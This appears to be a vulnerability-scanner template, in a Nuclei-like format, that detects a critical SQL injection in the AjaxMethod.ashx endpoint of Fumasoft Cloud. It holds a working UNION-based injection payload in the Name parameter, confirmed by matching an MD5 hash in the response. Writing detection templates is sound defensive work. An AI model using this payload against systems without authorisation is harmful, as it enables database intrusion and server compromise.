id: fumasoft-sqli
brief:
    title: Fumasoft Cloud - SQL Injection
    by: ritikchaddha
    level: critical
    about: There is a SQL injection vulnerability in the AjaxMethod.ashx file of Fumasoft Cloud. Attackers can obtain server permissions through the vulnerability
    label:
        - fumasoft
        - sqli
        - vuln
    score: CVSS:9.8
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y''+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{num}}'')),3,32)--'
      signs:
        - "on": word
          has:
            - '{{md5(num)}}'
          in: body
          need: all
        - "on": status
          status:
            - 500
